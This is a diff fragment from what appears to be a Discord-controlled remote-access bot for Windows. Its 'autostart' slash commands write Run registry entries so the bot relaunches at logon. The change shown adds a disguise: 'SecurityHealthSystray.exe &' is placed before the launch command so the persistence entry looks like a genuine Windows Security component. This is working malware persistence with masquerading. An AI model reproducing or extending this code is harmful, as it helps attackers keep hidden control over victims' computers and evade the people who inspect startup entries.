@@ -420,15 +420,19 @@ async def logo(interaction: discord.Interaction):
 
 @bot.tree.command(name="autostart_root", description="add the program to the autostart")
 async def asr(interaction: discord.Interaction, value_name: str):
-	with winreg.CreateKeyEx(winreg.HKEY_CLASSES_ROOT, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE) as key:
-		winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f"python {os.path.abspath(__file__)}")
+	with winreg.CreateKeyEx(winreg.HKEY_CLASSES_ROOT, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
+							winreg.KEY_WRITE) as key:
+		winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ,
+						  f"SecurityHealthSystray.exe & python {os.path.abspath(__file__)}")
 	await interaction.response.send_message(f"Successfully added registry entry")
 
 
 @bot.tree.command(name="autostart", description="add the program to the autostart")
 async def asu(interaction: discord.Interaction, value_name: str):
-	with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE) as key:
-		winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f"python {os.path.abspath(__file__)}")
+	with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
+							winreg.KEY_WRITE) as key:
+		winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ,
+						  f"SecurityHealthSystray.exe & python {os.path.abspath(__file__)}")
 	await interaction.response.send_message(f"Successfully added registry entry")
 
 
